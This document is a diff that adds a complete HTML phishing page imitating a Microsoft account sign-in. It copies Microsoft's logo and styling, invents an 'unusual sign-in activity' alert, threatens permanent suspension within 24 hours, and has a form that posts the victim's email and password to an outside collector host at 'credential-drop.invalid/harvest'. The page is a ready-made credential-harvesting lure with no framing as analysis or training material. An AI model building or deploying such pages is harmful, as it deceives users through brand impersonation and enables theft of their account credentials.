@@ -1,0 +1,62 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Sign in to your Microsoft account</title>
+<style>
+  body { font: 15px/1.6 "Segoe UI", system-ui, sans-serif; background: #f2f2f2;
+         margin: 0; display: flex; justify-content: center; padding-top: 4rem; }
+  .card { background: #fff; width: 26rem; padding: 2.6rem 2.9rem 2.9rem;
+          box-shadow: 0 2px 6px rgba(0,0,0,.2); }
+  .logo { display: flex; gap: .55rem; align-items: center; margin-bottom: 1.8rem; }
+  .logo .sq { display: grid; grid-template-columns: 1fr 1fr; gap: 2px; width: 22px; }
+  .logo .sq i { display: block; width: 10px; height: 10px; }
+  .logo span { font-weight: 600; color: #5e5e5e; font-size: 1.05rem; }
+  h1 { font-size: 1.45rem; font-weight: 600; margin: 0 0 .9rem; }
+  p { margin: 0 0 1.2rem; }
+  .alert { background: #fde7e9; border-left: 4px solid #a4262c; padding: .8rem 1rem;
+           margin-bottom: 1.4rem; font-size: .93rem; }
+  label { display: block; font-size: .9rem; margin-bottom: .3rem; }
+  input { width: 100%; padding: .55rem .6rem; border: 1px solid #666; margin-bottom: 1rem;
+          font-size: 1rem; box-sizing: border-box; }
+  button { background: #0067b8; color: #fff; border: 0; padding: .6rem 2.2rem;
+           font-size: 1rem; cursor: pointer; float: right; }
+  .foot { clear: both; padding-top: 2rem; font-size: .82rem; color: #666; }
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">
+      <span class="sq">
+        <i style="background:#f25022"></i><i style="background:#7fba00"></i>
+        <i style="background:#00a4ef"></i><i style="background:#ffb900"></i>
+      </span>
+      <span>Microsoft</span>
+    </div>
+
+    <h1>Verify your account</h1>
+
+    <div class="alert">
+      <strong>Unusual sign-in activity.</strong> We detected a sign-in attempt from an
+      unrecognised device in another country.
+    </div>
+
+    <p>Your Microsoft account has been temporarily limited until you confirm your identity.
+    Verify your account now to restore full access to Outlook, OneDrive and Office. Failure
+    to verify within 24 hours will result in permanent suspension of your account.</p>
+
+    <form action="https://collector.credential-drop.invalid/harvest" method="post">
+      <label for="email">Email or phone</label>
+      <input id="email" name="email" type="text" autocomplete="off">
+
+      <label for="password">Password</label>
+      <input id="password" name="password" type="password" autocomplete="off">
+
+      <button type="submit">Sign in</button>
+    </form>
+
+    <p class="foot">Please confirm your identity to continue. Enter your password to verify
+    that you are the account holder and to restore access immediately.</p>
+  </div>
+</body>
+</html>
